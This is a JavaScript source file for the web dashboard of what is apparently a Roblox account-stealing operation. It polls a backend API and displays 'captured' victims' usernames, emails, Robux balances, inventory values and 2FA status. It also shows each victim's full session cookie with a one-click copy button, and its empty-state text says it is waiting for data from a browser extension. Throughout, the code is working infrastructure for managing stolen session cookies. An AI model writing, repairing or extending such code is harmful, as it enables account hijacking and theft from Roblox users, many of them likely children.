// API Base URL
const API_URL = window.location.origin;

// Simpan accounts di memory supaya filter tidak perlu fetch ulang
let allAccounts = [];

// Load data on page load
document.addEventListener('DOMContentLoaded', () => {
    loadData();
    // Auto refresh every 30 seconds
    setInterval(loadData, 30000);
});

// Load all data
async function loadData() {
    try {
        const response = await fetch(`${API_URL}/api/accounts`);
        const data = await response.json();

        if (data.success) {
            allAccounts = data.accounts || [];
            renderAccounts(allAccounts);
            updateStats(data.stats, allAccounts);
            loadLogs();
        }
    } catch (error) {
        console.error('Error loading data:', error);
        document.getElementById('accountsGrid').innerHTML =
            '<div class="loading">❌ Error loading data. Please refresh.</div>';
    }
}

// Render accounts (terima array, apply filter & sort di sini)
function renderAccounts(accounts) {
    const grid = document.getElementById('accountsGrid');

    const filtered = applyFilter(accounts);

    if (!filtered || filtered.length === 0) {
        grid.innerHTML = `
            <div class="loading" style="grid-column: 1/-1;">
                📭 No accounts captured yet
                <br><small style="color: #445566;">Waiting for data from extension...</small>
            </div>
        `;
        return;
    }

    grid.innerHTML = filtered.map(account => `
        <div class="account-card">
            <span class="badge ${account.premium ? 'badge-premium' : 'badge-free'}">
                ${account.premium ? '⭐ PREMIUM' : 'FREE'}
            </span>
            ${account.twoFAEnabled ? '<span class="badge badge-2fa">🔒 2FA</span>' : ''}

            <div class="username">${account.displayName || account.username || 'Unknown'}</div>
            <div class="user-id">🆔 ${account.userId || 'N/A'}</div>

            <div class="info-grid">
                <div class="info-item">
                    <span class="label">💰 Robux</span>
                    <span class="value">${(account.robux || 0).toLocaleString()} R$</span>
                </div>
                <div class="info-item">
                    <span class="label">👥 Friends</span>
                    <span class="value">${account.friends || 0}</span>
                </div>
                <div class="info-item">
                    <span class="label">📅 Account Age</span>
                    <span class="value">${account.accountAge || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="label">📧 Email</span>
                    <span class="value">${account.emailVerified ? '✅' : '❌'} ${account.email || 'N/A'}</span>
                </div>
                <div class="info-item" style="grid-column: 1/-1;">
                    <span class="label">📦 Inventory Value</span>
                    <span class="value">${(account.inventoryValue || 0).toLocaleString()} R$</span>
                </div>
            </div>

            <div class="cookie-box">
                <textarea readonly rows="2">${account.cookie || 'No cookie'}</textarea>
                <button class="copy-btn" onclick="copyCookie('${(account.cookie || '').replace(/'/g, "\\'")}')">📋 Copy</button>
            </div>

            <div class="actions">
                <button class="btn-profile" onclick="openProfile('${account.userId}')">👤 Profile</button>
                <button class="btn-delete" onclick="deleteAccount('${account.userId}')">🗑️ Delete</button>
            </div>
        </div>
    `).join('');
}

// FIX: Ganti nama jadi applyFilter agar tidak konflik dengan fungsi refresh di bawah
function applyFilter(accounts) {
    const search = (document.getElementById('searchInput')?.value || '').toLowerCase();
    const premiumFilter = document.getElementById('filterPremium')?.value || 'all';
    const sortBy = document.getElementById('sortBy')?.value || 'newest';

    let filtered = accounts || [];

    // Search
    if (search) {
        filtered = filtered.filter(a =>
            a.username?.toLowerCase().includes(search) ||
            a.displayName?.toLowerCase().includes(search) ||
            String(a.userId || '').includes(search)
        );
    }

    // Premium filter
    if (premiumFilter === 'premium') {
        filtered = filtered.filter(a => a.premium === true);
    } else if (premiumFilter === 'free') {
        filtered = filtered.filter(a => !a.premium);
    }

    // Sort
    if (sortBy === 'newest') {
        filtered.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
    } else if (sortBy === 'oldest') {
        filtered.sort((a, b) => new Date(a.createdAt || 0) - new Date(b.createdAt || 0));
    } else if (sortBy === 'robux') {
        filtered.sort((a, b) => (b.robux || 0) - (a.robux || 0));
    }

    return filtered;
}

// Update stats - FIX: pakai data accounts yang sudah ada, tidak fetch ulang
function updateStats(stats, accounts) {
    document.getElementById('totalAccounts').textContent = stats?.totalAccounts || accounts.length || 0;
    document.getElementById('totalRobux').textContent = (stats?.totalRobux || 0).toLocaleString();

    // Hitung premium dari data yang sudah ada (tidak perlu fetch lagi)
    const premiumCount = (accounts || []).filter(a => a.premium).length;
    document.getElementById('premiumCount').textContent = premiumCount;
}

// Load logs
async function loadLogs() {
    try {
        const response = await fetch(`${API_URL}/api/stats`);
        const data = await response.json();

        if (data.success && data.recentLogs) {
            const container = document.getElementById('logsContainer');
            container.innerHTML = data.recentLogs.reverse().map(log => `
                <div class="log-entry">
                    <span>
                        <span class="log-type ${log.type}">${log.type}</span>
                        ${log.username ? `@${log.username}` : ''}
                        ${log.content ? `: ${log.content.substring(0, 50)}` : ''}
                    </span>
                    <span class="log-time">${new Date(log.timestamp).toLocaleString()}</span>
                </div>
            `).join('');
        }
    } catch (error) {
        console.error('Error loading logs:', error);
    }
}

// Copy cookie
function copyCookie(cookie) {
    if (cookie && cookie !== 'No cookie') {
        navigator.clipboard.writeText(cookie).then(() => {
            alert('✅ Cookie copied to clipboard!');
        }).catch(() => {
            // Fallback untuk browser yang tidak support clipboard API
            const textarea = document.createElement('textarea');
            textarea.value = cookie;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            alert('✅ Cookie copied!');
        });
    } else {
        alert('❌ No cookie to copy');
    }
}

// Open Roblox profile
function openProfile(userId) {
    window.open(`https://www.roblox.com/users/${userId}/profile`, '_blank');
}

// Delete account
async function deleteAccount(userId) {
    if (confirm('⚠️ Are you sure you want to delete this account?')) {
        try {
            const response = await fetch(`${API_URL}/api/account/${userId}`, {
                method: 'DELETE'
            });
            const data = await response.json();

            if (data.success) {
                alert('✅ Account deleted successfully');
                loadData();
            } else {
                alert('❌ Failed to delete account');
            }
        } catch (error) {
            alert('❌ Error deleting account');
        }
    }
}

// FIX: Fungsi ini dipanggil dari tombol filter/search/sort di HTML
// Tidak lagi konflik dengan applyFilter()
function refreshFilter() {
    renderAccounts(allAccounts);
}
